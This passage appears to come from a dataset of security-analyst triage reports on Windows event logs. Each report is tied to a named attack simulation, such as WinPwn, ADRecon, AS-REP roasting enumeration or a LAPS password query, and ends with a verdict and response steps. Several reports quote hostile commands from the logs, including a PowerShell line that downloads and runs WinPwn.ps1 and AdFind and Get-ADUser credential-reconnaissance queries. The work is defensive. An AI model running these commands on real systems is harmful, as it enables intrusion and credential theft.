4. **Sysmon Logs:** Various system commands executed by ""admin_test"" originate from suspicious batch files located in a temporary directory, `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\qakbot.bat`. Commands include executing network diagnostic and enumeration tools (e.g., `ipconfig`, `arp`, `netstat`, `nslookup`, etc.). This suggests potential reconnaissance activities, often conducted by malware or a malicious actor to gather information about the system and network.

5. **Detecting Malware Presence:** The presence of a file named ""qakbot.bat"" indicates a potential Qakbot (or Qbot) malware infection. Qakbot is known for its lateral movement, credential theft, and network reconnaissance capabilities.

6. **Software Installation Events:** Logs show Microsoft Edge installation activities, which are typically benign. However, since this installation's command sequences come after potentially malicious script execution, it's essential to confirm they aren't an attempt to obfuscate or disguise malicious activity by blending it with legitimate software actions.

### Assessment and Conclusion

Based on the analysis, there is enough evidence to suggest that these logs potentially reflect malicious activity:

- The execution of a suspicious batch script from a temporary directory contains a name associated with known malware, combined with system and network reconnaissance commands, suggests compromise.
- The high privileges assigned to the ""admin_test"" user and repeated NTLM authentications signal a possible misuse of administrative credentials, potentially aligning with lateral movement or privilege escalation strategies commonly used by attackers.

### Threat and Risk

- **High:** The presence of the batch script linked to known malware tactics and high privilege operations suggests a threat actor presence, aiming to gather network details and potentially establish persistence or further their level of access.

### Recommendation for Action

- **Immediate Investigation:** Conduct a forensic analysis on the host and potentially affected systems to determine the full impact and scope.
- **Containment:** Isolate the potentially compromised machine to prevent further lateral movement within the network.
- **Review User Activity:** Examine any activity by the ""admin_test"" account for abnormal patterns or unauthorized changes.
- **Increase Monitoring:** Enhance monitoring and detection capabilities to capture subsequent or lateral actions from potential attackers.
- **Ensure Patching and Updates:** Verify that all systems are up to date with the latest security patches to reduce the attack surface.

### Final Resolution
**MALICIOUS** - The activity represented in these logs indicates a high likelihood of a malicious compromise or infection requiring immediate attention and further investigation."
Automated AD Recon (ADRecon),"In examining the provided logs, several activities have raised red flags, including unusual PowerShell execution and privilege escalation attempts. Below is a detailed analysis:

1. **PowerShell Activity:**
   - Windows PowerShell logs show that a script, `ADRecon.ps1`, is being executed from a temporary directory by `powershell.exe`. The usage of `Invoke-Expression` often indicates potentially malicious activity, especially when files are executed from temporary folders or through environment variables. This pattern of execution can be indicative of attempts to gather directory information, potentially for reconnaissance purposes.

2. **Privileged Logons and Privilege Escalation:**
   - Several Security Audit logs indicate logon events with Event ID 4624 (Logon Type 5) which is typically associated with a service logon. While these are not inherently malicious, they precede Event ID 4672 logs, which indicate special privileges have been assigned, such as `SeDebugPrivilege`, `SeTcbPrivilege`, and others that are often targeted in privilege escalation attacks. 
   - The presence of elevated tokens (indicated by `ElevatedToken=%%1842`) in these logon events suggests that the involved process is running with administrative privileges.

3. **Credential Access Attempts:**
   - Event ID 5379 logs indicate multiple failed attempts to access credentials for `MicrosoftAccount:user=02txoixylodcstop` and `WindowsLive:(token)` accounts. The high frequency and nature of these attempts are concerning and could suggest efforts to harvest credentials.

4. **Process Execution Logs:**
   - Sysmon logs capture the execution of several system utilities from paths like `C:\Windows\System32\sc.exe`, `svchost.exe`, and `wevtutil.exe`. While these are common administrative tools, their use, combined with other suspicious activities in the logs, may indicate their potential misuse for illegitimate purposes, such as disabling security features or persistent activities.

5. **Process Creation:**
   - The Windows Sysmon logs show execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. This combination is unusual outside of legitimate administrative context and can be indicative of attempts to tamper with event logs or capture console output, potentially as part of a larger compromise effort.

**Resolution: SUSPICIOUS**

The combination of unauthorized PowerShell execution, attempts at accessing sensitive accounts, escalation of privileges, and execution of system utilities suggests that further investigation is warranted. This activity is highly suspicious, and although it may not conclusively indicate breach, the risk of compromise is significant.

**Guidance on How to Proceed:**
- Initiate a thorough investigation into the PowerShell script to determine its intent and capabilities.
- Review the accounts involved in the privileged activities and check for any signs of unauthorized access or tampering.
- Investigate the lineage and context of system utilities like `wevtutil.exe`, `conhost.exe`, and associated logon sessions.
- Conduct network and host-based analysis to search for indications of lateral movement or data exfiltration.
- Consider isolating the affected systems until a full assessment can be made and take steps to secure any discovered vulnerabilities or exposed services."
WinPwn - winPEAS,"Upon reviewing the provided Windows event logs, the following observations and analysis have been made:

### Observations and Analysis:

1. **Windows PowerShell Log:**
   - There is repeated execution of a PowerShell command linked to the `HostApplication` field, indicating a sequence that involves downloading and executing a script from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`.
   - The script being downloaded and executed is associated with a tool called ""WinPwn,"" which is often used for privilege escalation and enumeration on Windows systems.
   - The usage of `iex(new-object net.webclient).downloadstring(...)` in PowerShell is a known pattern for downloading and executing scripts directly from the internet, which is considered risky behavior unless explicitly authorized and audited.

2. **System Log:**
   - The logs primarily depict system time changes managed by `svchost.exe`, aligning with the Time Service selecting a time source (`time.windows.com`). No anomalies are apparent in these logs that relate to specific malicious activities.

3. **Application Log:**
   - Contains logs related to the status of Windows Defender (`SECURITY_PRODUCT_STATE_ON`) and the stopping of the `edgeupdate` service. The presence of Windows Defender in an active state suggests endpoint protection is operational; no explicit concerns arise from `edgeupdate` service stops unless correlated with actual browsing anomalies or external unauthorized installs.

4. **Sysmon Log:**
   - The Sysmon logs provide insights into process creation events, highlighting `powershell.exe` with the same malicious PowerShell execution pattern discussed earlier.
   - Various administrative command-line uses involving `conhost.exe` and `whoami.exe` are typical for enumeration purposes, and these could be part of routine administrative operations; however, combined with the PowerShell activity, they could also signify a potential reconnaissance activity.

5. **Security Log:**
   - The security logs do not directly show any privilege escalations or failed attempts. They detail system time adjustments via authorized processes.

### Assessment:
Given the logs, the most significant concern is the automated execution of the PowerShell script (`WinPwn.ps1`) from a non-trusted source using methodologies typically seen in attacks (download and execute pattern). This is often indicative of initial access or privilege escalation attempts. The conjunction of admin-level command executions further suggests potential malicious reconnaissance activity.

### Resolution:
- **MALICIOUS**: The activity recorded in the PowerShell logs constitutes a clear indicator of potential malicious activity. The execution of untrusted scripts from external repositories directly from PowerShell is a well-known tactic used to compromise systems or escalate privileges.

### Guidance to Proceed:
1. **Immediate Isolation**: The server in question, `Server002`, should be isolated from the network to prevent potential lateral movement or data exfiltration.
2. **Incident Response**: Engage the incident response team to perform forensic analysis and further investigate the source and impact of the script execution.
3. **Log Review and HR Inquiry**: Review user activity logs to determine if the `admin_test` user is authorized to perform such actions. If unauthorized, further HR involvement may be necessary.
4. **System Hardening**: Ensure execution policies in PowerShell are stricter, limiting the ability to download and run scripts from untrusted sources.
5. **Threat Intelligence**: Check if the downloaded script and associated domain are known indicators of compromise (IOCs) and take appropriate block actions within security appliances."
System Service Discovery - net.exe,"Upon careful review of the provided Windows event logs, several observations and assessments are made:

1. **Security Logs**:
   - Two occurrences of event ID 4672, which indicates special privilege assignments to users upon logging in, are noticed for the user `admin_test`. The privileges include powerful rights such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. There's no direct indication of misuse in the logs provided, but these high-level privileges can be concerning if unwarranted.
   - Event ID 4624 logs show successful logins using NTLM from IP address `fe80::e3b5:5371:12a8:9c77`, which is a link-local IPv6 address, suggesting that the login attempts were made from within the same network. The user is `admin_test`, and the LogonType is 3 (network logon), which is typically normal in a network environment but still should be periodically verified against expected behavior.
   - Event ID 4634 logs a logoff process for the `admin_test` user. 

2. **Sysmon Logs**:
   - Frequent executions of `wevtutil.exe` are observed, handled by the user `admin_test`. `wevtutil` is typically used for managing event logs. If not expected in regular operations, this might suggest attempts to tamper with or clear logs.
   - The `cmd.exe` process with a command line of `""cmd.exe"" /c net.exe start >> %temp%\service-list.txt` executed under the `admin_test` user could indicate collection or enumeration of services. While not inherently malicious, enumeration activities can be a precursor to malicious activities.
   - Multiple legitimate processes are launched such as `whoami.exe`, `net1.exe`, `hostname.exe`, mostly executed by `admin_test` with high integrity level, which suggests that the user had high privileges. This can be normal behavior during script execution or system administration but could be employed for reconnaissance in an attack scenario.

3. **System Logs**:
   - Windows Update activity is logged with Event IDs 44 and 43 for Microsoft Defender Antivirus updates. This reflects routine updating process and appears normal.

4. **General Observation**:
   - Regular administrative-level activity by `admin_test` is noted throughout logs. While high privileges are utilized, which can be expected in administrative contexts, the frequency and the usage of specific tools and commands such as `wevtutil`, `cmd.exe` with specific flags, might hint at potential misuse or preparatory actions.

**Assessment**:
- **SUSPICIOUS**: The event logs display activities that deviate from common administrative routines through frequent use of administrative-level privileges and specific utility executions that could indicate tool preparation for further reconnaissance or tampering. Further investigation is warranted, including validating the necessity and context of these actions with the responsible personnel and monitoring for further unusual behaviors.

**Guidance on How to Proceed**:
- Verify if `admin_test` actions align with routine system maintenance or aligned scripts for administrative tasks.
- Cross-reference `admin_test` login and task execution with external logs (such as firewall, intrusion detection systems) for possible anomalies or unauthorized access.
- Review user access and privilege policies to ensure these privileges are appropriate and required.
- Intensify monitoring on `admin_test` activities and possibly conduct a security awareness check for users on privilege best practices.
- If actions cannot be justified or if unusual patterns continue, consider an audit or stepping up security controls around this account."
Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting),"Upon reviewing the event logs provided, several points of interest and potential concerns can be identified:

### Security Log Analysis:
- **Event ID 4624 and 4672** indicate successful logins and the assignment of special privileges to the SYSTEM account. This is typical for system-level actions and not inherently suspicious unless context suggests an anomaly.
- **Event ID 5379** shows credential validation attempts that failed based on the error code `3221226021`, which translates to ""The specified account does not exist"". These are not uncommon but could warrant further investigation depending on context.
- **Event ID 4798** involves enumeration of user accounts and details, which could raise suspicion if done frequently or by unauthorized users.

### Application Log Analysis:
- The log entries related to ""edgeupdate"" and ""Software Protection Platform"" indicate routine system activities related to updates and licensing checks. The presence of Windows Defender indicates it is active and functioning.

### Sysmon Log Analysis:
- Multiple instances of `wevtutil.exe` and `powershell.exe` are observed:
  - **Powershell Executions**: Uses such as `{Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name}` indicate user enumeration via Active Directory commands. This action can be associated with legitimate administrative or audit tasks but can also indicate reconnaissance activity if performed without proper authorization.
  - **Wevtutil.exe Usage**: Suggests event log management, which is common in both administrative maintenance and malicious activity aimed at covering tracks.
- Several legitimate system processes (e.g., `wermgr.exe`, `rundll32.exe`, etc.) are observed; their execution details do not suggest immediate issues but always worth checking against recent administrative tasks to validate actions.

### Windows PowerShell Log Analysis:
- The PowerShell execution involving Get-ADUser is consistent with the Sysmon logs. The command itself is harmless but context-dependent for suspiciousness.

### Final Assessment:
Given the information extracted, the logs indicate actions that could be associated with typical system maintenance or administrative duties. However, some activities, such as process creation for system utility tools like PowerShell and wevtutil, especially querying user accounts with PowerShell, might deserve additional scrutiny to ensure they are consistent with expected administrative activities and permissions.

### Resolution:
- **SUSPICIOUS**: Although no explicit malicious activities were detected, there are enough instances of elevated command and process usage to warrant additional investigations, particularly to confirm that actions were authorized and align with normal operational duties.

### Guidance on How to Proceed:
- Verify the legitimacy and authorization of detected PowerShell and wevtutil usage. Ensure these actions align with scheduled tasks or known administrative procedures.
- Review logs for specific dates and times around these events to identify any unauthorized access or unexpected behavior prior or after these actions.
- If possible, correlate these findings with user activity logs or alerts in other systems for additional context.
- Consider implementing stricter monitoring on powerful tools like PowerShell and wevtutil for detailed command-line logging and context capture in future observance."
Device Driver Discovery,"Upon review and analysis of the provided Windows event logs, several observations can be made:

1. **Consistent Usage of System Utilities**:
   - The logs predominantly display the use of standard Windows utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `powershell.exe`, and `driverquery.exe`.
   - These utilities are typically used for legitimate system operations, like event logging (`wevtutil.exe`), console management (`conhost.exe`), retrieving system information (`hostname.exe`, `whoami.exe`, `driverquery.exe`), and shell operations (`powershell.exe`).

2. **Command Execution with PowerShell**:
   - The command-line argument seen with PowerShell execution is `""powershell.exe"" & {driverquery /v /fo list, driverquery /si /fo list}`.
   - The `driverquery` command is being used to collect information about the drivers on the system. This usage appears systematic and related to maintenance or auditing.

3. **Logon Events and Privilege Assignment**:
   - There are event IDs like 4624 and 4672 indicating successful logons and the assignment of special privileges to the user `admin_test`.
   - The privileges granted (SeDebugPrivilege, SeImpersonatePrivilege, etc.) are consistent with those typically granted to administrative users.

4. **Suspicious Behavior Indicators**:
   - The logs show activities from an account ""SERVER002\\admin_test"", executing commands with high integrity, hinting at an admin user or script.
   - The frequent querying of drivers and elevated privileges may indicate a user conducting updates or audits, which lacks context but is not inherently malicious.

5. **Edge Update Activity**:
   - There are multiple instances of Microsoft Edge Update processes and their logs appearing without any signs of anomalous or atypical behavior.
   - These logs align with typical application update processes, especially for a system managed by an admin.

6. **Timezone and System Activities**:
   - The system time was adjusted, as indicated by events with ID 1 from the ""Kernel-General"" source. This change does not inherently indicate malicious intent, particularly in the context of timezone adjustments.

**Conclusion and Resolution**:

The logs reflect a series of activities that appear to fit within the scope of regular administrative behavior, such as system maintenance, updates, and log querying. While some activities like frequent execution of driver queries and the adjustment of privileges appear extensive, no definitive proof of malicious actions was identified here. These activities might warrant discussion with the user ""admin_test"" to ensure they align with expected administrative tasks.

**Resolution**: **BENIGN**

**Further Guidance**:
- Engage in dialogue with the server administrator to verify these activities were intentionally conducted.
- Continue monitoring for any outliers or further unexpected command executions outside regular maintenance windows."
WinPwn - MS17-10,"Based on the provided Windows event logs, let's go through each section to identify suspicious or potentially malicious activities.

### System Log

- **Time Synchronization Events**: There are multiple events regarding time changes (Event ID 1 and 24) by the `svchost.exe` process using the LOCAL SERVICE account. These actions are typical for legitimate Windows operations when synchronizing time, especially using `time.windows.com`. There is no indication of malicious behavior in these events.

### Windows PowerShell Log

- **Suspicious PowerShell Activity**: The logs indicate PowerShell execution with a command to download and execute a script from a GitHub repository URL: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. This specific script relates to exploiting `MS17-10`, a known vulnerability in Windows SMBv1 service (EternalBlue). The use of `iex` (Invoke-Expression) and `new-object net.webclient` to download and execute external scripts is a common sign of malicious activity.

### Security Log

- **Logon Activities**: The security log shows an NTLM authentication process initiated from an external IP address. The session was established from `DESKTOP-3HL5B2P` for user `admin_test` with elevated privileges (Event ID 4672). This could be legitimate but should be verified as NTLM over network with privileged access can be suspicious if there's no context for the connection.

### Application Log

- **No Anomalous Activity**: The entries present are related to Windows Defender status, and there's no evidence of disablement or issues with the antivirus engine.

### Sysmon Log

- **Process Execution Monitoring**: Several process creation events using `svchost.exe`, `conhost.exe`, `wevtutil.exe`, and others are recorded. The most noteworthy is the execution of a PowerShell process downloading a script, consistent with the information from the Windows PowerShell log.

### Analysis Summary

- The most concerning evidence is the PowerShell command execution that downloads and runs the `WinPwn.ps1` script from a public GitHub repository. This script suggests an attempt to exploit the `MS17-10` vulnerability, which is a strong indicator of malicious activity.
- The access pattern of the user `admin_test`, including NTLM authentication and use of higher privileges, should be examined if this type of connection was expected.

### Assessment and Recommendation

**Resolution: MALICIOUS**

- The activity found in the PowerShell logs is indicative of a potentially successful exploit attempt using a known exploit tool. The PowerShell script involves behavior typical of an attack exploiting SMB vulnerabilities.
- Immediate actions should include isolating and removing the affected system from the network, conducting a thorough forensic investigation to comprehend the extent of the compromise, and applying the latest security patches to prevent further exploitation.
- Verify the user `admin_test` activity and origin to ensure that the actions were authorized; take action if unauthorized access is confirmed.

In conclusion, there is clear evidence of malicious activity in the provided logs. Steps should be taken swiftly to contain and begin remediation efforts."
Port Scan NMap for Windows,"Based on the analysis of the provided logs, here is the detailed assessment:

### Suspicious and Anomalous Behaviors:

1. **Installation and Execution of Network Tools**:
   - The logs indicate the installation of the **Npcap Packet Driver**, which is often used with network monitoring tools like Nmap. Coupled with a System log entry showing the `npcap.sys` driver being initiated and the execution of **Nmap** itself (`nmap 127.0.0.1`), this can indicate potential reconnaissance activity. Such installations and executions should typically be subject to restrictive policies, especially on production or sensitive systems.

2. **Use of PowerShell**:
   - Multiple PowerShell commands were executed, often used for legitimate administrative actions, but it is also a popular tool for attackers because of its flexibility and power. The execution of Nmap through PowerShell, as seen in `powershell.exe & {nmap 127.0.0.1}`, suggests that administrative privileges or scripting is being used potentially for scanning or reconnaissance.

3. **Use of CertUtil**:
   - CertUtil is a Windows utility that has been leveraged in living-off-the-land binary techniques (LOLBin) for malicious purposes. CertUtil was used here potentially to add certificates, which could indicate malicious intent, especially when coupled with downloaded or temporarily stored files.

4. **Suspicious Scheduled Task**:
   - The creation of a scheduled task named `npcapwatchdog` using `SCHTASKS.EXE` is seen in the logs. Scheduled tasks can be used for persistence by malware, and the use of a watchdog-like task is unusual unless it is part of a legitimate application install, which should be verified.

5. **Registry Modifications**:
   - Registry modifications via `regedit.exe` and `regedt32.exe` can be benign, but it's notable when combined with other suspicious activities. The `nmap_performance.reg` registry file suggests configuration changes related to Nmap use or installation, which can be a red flag in certain environments.

6. **Installation of Additional Software Components**:
   - The installation of Microsoft Visual C++ Redistributables (`vcredist_x86.exe` and others) were noted in multiple application logs. While common, it should be verified whether these are expected updates or installs in the context of other unusual activities.

### Conclusion:
- The combination of Nmap being downloaded and executed, PowerShell use, the installation of network drivers, use of CertUtil, and modification of the registry all point toward potentially suspicious activity, if not performed by a legitimate user or for authorized purposes.

### Threat Assessment and Guidance:
- **Resolution:** **SUSPICIOUS**
- **Actionable Steps:**
  1. **Verify User Intent**: Confirm if the user `SERVER002\\admin_test` intended to install and use these tools. Determine if this was for legitimate testing or configuration purposes.
  2. **Check for Policies**: Ensure policies around the use of tools like Nmap, and installation of drivers like Npcap are being enforced.
  3. **Review Scheduled Tasks**: Ensure the `npcapwatchdog` task is legitimate and determine its necessity.
  4. **Network Scans**: Conduct network scans to ensure no unauthorized network mapping or penetration testing is occurring.
  5. **Consult with Stakeholders**: If these actions were unauthorized, consult with your security team or stakeholders to decide on further investigation measures or mitigation steps.
  6. **Monitor Future Activities**: Set alerts for similar activities in the future to preemptively catch potential misuse.

The combination of activities suggests a need for a deep dive by security to ensure this activity aligns with a known and controlled operation."
Get-DomainGPO to display group policy information via PowerView,"### Analysis of Logs:

1. **Windows PowerShell Logs:**
   - **Suspicious Command Execution**: Multiple entries show PowerShell being run with the `-nop -exec bypass` flags, which are commonly used to evade execution policy restrictions. The command also uses the `IEX` (Invoke-Expression) cmdlet to execute a script directly from the internet, specifically from GitHub. The script is part of the BC-Security's Empire framework, which is an open-source penetration testing tool. This pattern of behavior is a strong indicator of potential malicious activity or misuse, as attackers often use such methods to download and execute scripts remotely without leaving traces on disk.

2. **Sysmon Logs:**
   - **Process Activity**: The logs provide various process creation events but do not show directly malicious executable names or paths besides the PowerShell activity noted in the PowerShell logs. 
   - **User Context**: Activity is associated with the user `SERVER002\admin_test`, who might have been the perpetrator or victim, depending on whether this execution was authorized or part of penetration testing the environment.
   - **Timeframe Correlation**: The Sysmon events mostly align with the suspicious PowerShell activity timeframe, indicating consistency between logs.

3. **Application, System, and Security Logs:**
   - These logs appear to be normal system operations, such as time synchronization, updates, and other routine tasks. Noteworthy here is the lack of anomalous patterns typically associated with compromise indicators like user account changes, suspicious logons, or privilege escalations in this part of the logs.

### Assessment:
The logs contain a clear instance of PowerShell being used in a potentially malicious manner, specifically using a technique that is commonly associated with malware and red team operations to execute remote code. The specific use of downloading a script from a reputable source for penetration testing frameworks raises red flags unless this activity was part of an authorized security assessment.

### Resolution:
- **MALICIOUS**: The pattern of PowerShell usage indicates unauthorized execution of potentially harmful scripts. Immediate action is recommended to contain and investigate further.
  
### Guidance on Proceeding:
1. **Immediate Response Actions:**
   - Disable the user account `SERVER002\admin_test` temporarily if it is suspected to be compromised.
   - Perform a network isolation of `Server002` to prevent potential lateral movement or data exfiltration.

2. **Forensic Investigation:**
   - Review system integrity by checking for any changes to critical system files, unauthorized access, or modifications.
   - Utilize endpoint detection and response tools to trace any subsequent activity resulting from the script execution.

3. **Notification and Reporting:**
   - Notify the incident response team and management about the findings for awareness and structured response procedures.
   - Document the incident details for compliance and future reference.

4. **Preventive Measures:**
   - Implement strict PowerShell script execution policies, including logging and controlling the use of specific PowerShell flags like `-nop` and `-exec bypass`.
   - Consider implementing application whitelisting and network threat detection to detect and block such activities proactively in the future."
Detect Virtualization Environment via WMI Manufacturer-Model Listing (Windows),"Upon examining the provided logs, several observations and patterns can lead to an assessment of their nature and potential malicious activity. Here's a breakdown of significant findings:

1. **Security Log Analysis**:
   - The logs indicate typical time synchronization activities featuring the `svchost.exe` process, which is expected for time-related changes.
   - No unexpected privilege escalations or uncommon processes are evident that suggest overtly malicious behavior in this segment.

2. **Windows PowerShell Log Analysis**:
   - The PowerShell logs provided contain a script to detect virtualization environments. While often used for benign administrative purposes, it can sometimes be indicative of initial reconnaissance by an attacker assessing their environment.
   - The detection of virtualization by PowerShell could be a tactic to avoid analysis in controlled (virtualized) environments. This script itself, however, does not independently indicate malicious behavior unless tied to suspicious follow-up actions or events.

3. **Application Log Analysis**:
   - Logs include typical software protection platform events and edge updates, with no anomalies indicating compromises. These are characteristic of legitimate system updates and operations.

4. **System Log Analysis**:
   - System log data are consistent with regular time-update functions and do not exhibit out-of-the-ordinary activity.
   
5. **Sysmon Log Analysis**:
   - There is notable frequent logging of `wevtutil.exe` and `conhost.exe` executions. While this could signal typical operational noise or administrative monitoring activities, without specific context or deviation from baseline behavior, this remains ambiguous.
   - Host processes, such as `hostname.exe` and `whoami.exe`, are seen executed which are normal utility executions, often used for information gathering in both benign and malicious contexts.
   - Microsoft Edge updates via `MicrosoftEdgeUpdate.exe` are recorded, aligning with normal scheduled tasks for maintaining applications.

### Assessment:

Given the logs, the main items worthy of attention are the PowerShell script detecting virtualization, and the repeated listing of event utility processes (`wevtutil.exe`), which might suggest sysadmin tasks or initial adversary reconnaissance.

### Resolution:

Based on the current log entries, there are no definitive indicators of compromise or clear malicious activity. The observed PowerShell activity and `wevtutil.exe` involvement deserve contextual evaluation relative to baseline system behavior, but alone, they do not confirm malicious intent.

Therefore, the resolution of this assessment is:

- **SUSPICIOUS** - Further investigation is suggested to determine the intention and context surrounding the PowerShell script execution and event utility processes. Proactive steps include verifying recent changes in server management activities, coverage checks against a known good baseline, and ensuring no compromised accounts."
Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd,"Upon thorough investigation of the provided logs, several pieces of log data potentially indicate suspicious activity. Here's the breakdown of the analysis:

### Suspicious or Anomalous Behavior:

1. **Security Log Time Changes (Event ID 4616):**
   - The security logs show time changes initiated by the `svc` process, with `LOCAL SERVICE` as the user. Frequent system time adjustments can be a tactic used by malicious actors to evade time-based security controls, although, in this context, the changes are just a few milliseconds and may not be inherently malicious.

2. **PowerShell Log:**
   - A PowerShell script was executed via `powershell.exe` involving the use of `AdFind.exe`. The script looks for specific attributes (`ms-Mcs-AdmPwd`, `ms-Mcs-AdmPwdExpirationTime`) within the domain. AdFind is a legitimate tool, but its usage in this manner, especially when executed from a temporary path, is suspicious as it can be used for credential dumping or reconnaissance.
   - The log indicates PowerShell is being used to query the Active Directory for computer objects and potentially sensitive data (e.g., passwords and expiration times). This behavior is often seen in lateral movement and preparation phases of an attack.

3. **Sysmon Log:**
   - Execution of `whoami.exe` and `hostname.exe` might be benign, though frequent usage in a short timeframe could indicate reconnaissance to gather user and machine information.
   - Multiple instances of `wevtutil.exe` (a tool for managing Windows Event Logs) are captured. This tool could be used for log clearing or log manipulation, commonly associated with covering tracks post-compromise.

4. **System Log and Application Log:**
   - These logs contain standard entries related to system start-up processes and services. Nothing particularly stands out as malicious here in regard to content but should be matched against behavior patterns that they precede or follow.

### Assessment:

- The execution of `AdFind.exe` via PowerShell from a non-standard directory with attributes related to managed passwords in Active Directory is highly suspicious. While it is possible legitimate administrators could use similar scripts, the context is more in line with activities seen in red team engagements or by malicious actors gathering information for further attacks.
- The presence of repeated and possibly automated Windows Event Log manipulation tools (`wevtutil.exe`) suggests potential attempts at log clearing, a typical behavior in the latter stages of an intrusion.

### Conclusion:

**Resolution: SUSPICIOUS**

These logs contain activity that does not look right and needs more investigation. Specific instructions would be to:
- Verify if the use of `AdFind.exe` from that path and with those arguments is authorized by the IT team.
- Investigate any recent administrative behavior changes, especially involving directory services.
- Forensically investigate the logs for authenticity, especially where `wevtutil.exe` has been used, to ensure logs have not been altered or purged.
- Increase monitoring on the user `SERVER002\\admin_test` and any further PowerShell or `svchost.exe` usage.

Further investigation would be advised before elevating to a malicious report, potentially investigating with a focus on the behavior around Active Directory querying and Windows Event Log integrity."
View available share drives,"**Detailed Analysis of the Windows Event Logs:**

1. **Security Logs:**
   - The logs primarily consist of Event ID 4616 related to time changes. Changes in system time can be suspicious, but the change here is very slight and could be system or service-related, especially since it involves `svchost.exe`, a legitimate Windows process. There are no unusual user accounts or privilege escalation attempts.

2. **System Logs:**
   - These show events from the Windows Update system and time service adjustments which are normal. Events from the ""Microsoft-Windows-Kernel-General"" provider deal with timezone or time changes, again registered events with `svchost.exe` as the process, which does not suggest malicious activity by itself.

3. **Application Logs:**
   - The logs include entries from ""SecurityCenter"" indicating Windows Defender is active. ""edgeupdate"" service stops are displayed, suggesting typical update or service alteration events related to Microsoft Edge updates.

4. **Sysmon Logs:**
   - Sysmon logs capture process creations and terminations. Multiple entries for `wevtutil.exe` and `conhost.exe` processes seem initiated by a user ""SERVER002\admin_test"". The use of `wevtutil.exe`, a legitimate command-line utility for querying event logs, can sometimes indicate a user inspecting logs, but there is no evidence of unusual or malicious commands executed by this utility here.
   - `cmd.exe` is invoked with `net share`, a command that displays or manages shared resources, by ""SERVER002\\admin_test"". This activity could be suspicious if unexpected but does not directly indicate malicious behavior without more context about the user's intent.
   - Processes related to Microsoft Edge updates are quite frequent, indicating routine updates to Microsoft Edge by `MicrosoftEdgeUpdate.exe` which is expected on modern Windows systems.

5. **General Observations:**
   - There is no evidence of privilege escalation, suspicious command-line arguments, or unusual processes starting from non-standard paths. The pattern of processes and logged events are consistent with system maintenance and legitimate user activity rather than an attack or compromise.

**Assessment of the Situation:**

The log analysis shows usual system activity, with all processes related to either system operations (like time adjustments and Defender updates) or legitimate user activity (`wevtutil.exe`, `net share`). There is no obvious sign of malware execution or privilege escalation through these events.

**Resolution: BENIGN**

No indicators of malicious activity were identified in these logs. The logs reflect typical system and user behavior without signs of compromise. However, as a precaution, the user's actions involving `net share` and `wevtutil.exe` could be reviewed in a broader context for assurance, especially if any policies restrict their usage."
Enumerate Remote Hosts with Netscan,"Upon reviewing the provided logs, we have analyzed them for any anomalies or malicious activities. Here’s a detailed analysis of the findings:

### **Security Log Analysis:**
1. **Event ID 5379:**
   - This event corresponds to the Credential Validation process. Each event contains a `ReturnCode` of 3221226021, translating to `STATUS_NO_SUCH_LOGON_SESSION`. This typically indicates failed operations but is not necessarily malicious on its own.
   - All activities originate from the same system account (S-1-5-18) and involve credential validation attempts to various Microsoft services, such as `MicrosoftAccount` and `WindowsLive`. These failed attempts are minimal indicators of potential account issues but don’t show clear signs of malicious intent.

2. **Event ID 4624 and 4672:**
   - Event 4624 indicates a successful logon as `SYSTEM`, using the `Advapi` process. While this is a normal event for system-level operations, it is important due to `ElevatedToken`.
   - Event 4672 details special privileges assigned to `SYSTEM`, which is standard for system operations. These privileges include high-impact rights such as `SeDebugPrivilege`.

### **Sysmon Log Analysis:**
1. **Edge Update Process:**
   - Multiple Sysmon entries detail normal update processes for Microsoft Edge, including installer executions and setup operations. These activities are expected and aligned with standard software update procedures.

2. **Suspicious PowerShell Execution:**
   - There is a notable pattern involving PowerShell executions for a Netscan utility (`netscan.exe`) located in a temporary directory.
   - Commands involving `cmd.exe` executing this network-scanning tool are often considered suspicious, especially in the context of active enumeration on a workstation.
   - The presence of `netscan.exe` might indicate internal network reconnaissance if this was unauthorized.

### **Windows PowerShell Log Analysis:**
- Logs show PowerShell activities initiating and subsequently closing, with command-line execution of the `netscan.exe` utility.
- The utility is run against the localhost `127.0.0.1`, which could be a benign action related to local processes. However, its use and context warrant further examination regarding the necessity and authorization of this scan on the system.

### **System Log Analysis:**
- Windows Update logs indicate recent updates to security intelligence for Microsoft Defender. These activities align with routine system maintenance and do not suggest malicious behavior on their own.

### **Conclusion:**
- Primary concern lies with the execution of `netscan.exe` via PowerShell. This behavior might suggest internal network probing, which could reflect unauthorized exploration on the system.
- The failed credential validation attempts may indicate issues with user authentication, but without further connected malicious context, it is not deemed a direct threat.

### **Resolution: SUSPICIOUS**

- **Guidance and Next Steps:**
  1. Investigate the use and purpose of `netscan.exe`, including authorization and scope.
  2. Ensure that the system’s authentication attempts are legitimate and not part of credential-stuffing activities.
  3. Conduct further monitoring on Server002 for any unexplained or unauthorized network activity.
  4. If unauthorized network scanning is confirmed, review and improve endpoint protection and network segmentation policies.

Such vigilance and precautionary actions can help distinguish between benign anomalies and potential compromises."
Peripheral Device Discovery via fsutil,"Upon examining the provided event logs, here is a detailed analysis of potential indicators of suspicious or malicious activity:

### Analysis:
1. **Application Log:**
   - The application log entries primarily involve the `edgeupdate` service stopping. These entries do not inherently indicate malicious activity; stopping services can be part of normal system operations or software updates.

2. **System Log:**
   - The system log shows time adjustments related to the Windows Time Service, performed by `svchost.exe`. This is typically normal when the system synchronizes time with Windows Time Servers (`time.windows.com`). There are no obvious indicators of compromise or malicious intent.

3. **Security Log:**
   - The security log entries indicate time change events, consistent with synchronizations found in the system log. These changes are performed by a trusted process (`svchost.exe`) under the `LOCAL SERVICE` account, which is standard behavior.

4. **Sysmon Log:**
   - Several processes such as `hostname.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe` were executed. These processes are not necessarily indicators of malicious activity but could represent system diagnostics or administrative tasks if performed legitimately.
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and its related executable components being executed. The behavior seems consistent with Microsoft Edge updating itself, which normally occurs periodically.
